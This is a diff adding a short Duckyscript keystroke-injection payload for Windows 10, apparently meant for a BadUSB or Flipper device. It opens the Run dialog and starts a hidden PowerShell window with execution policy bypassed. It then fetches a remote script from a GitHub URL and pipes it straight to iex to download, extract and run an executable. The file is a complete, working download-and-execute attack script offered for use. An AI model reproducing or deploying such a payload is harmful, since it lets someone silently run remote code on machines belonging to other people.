@@ -1,0 +1,16 @@
+REM Title: 3noc1d1c4
+REM Author: 3noc1d1c4
+REM Description: this script downloads opensonic to documents/evil.zip then extracts it to documents/evil and runs opensonic.exe from the folder. Ps1 uploaded in same folder for ease of modification.
+REM Target: Windows 10
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove "-W H" to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C irm https://raw.githubusercontent.com/knoxoxen/flipperstuffs/main/download%20zip%20and%20extract%20runexe.ps1 | iex
+ENTER
+
+
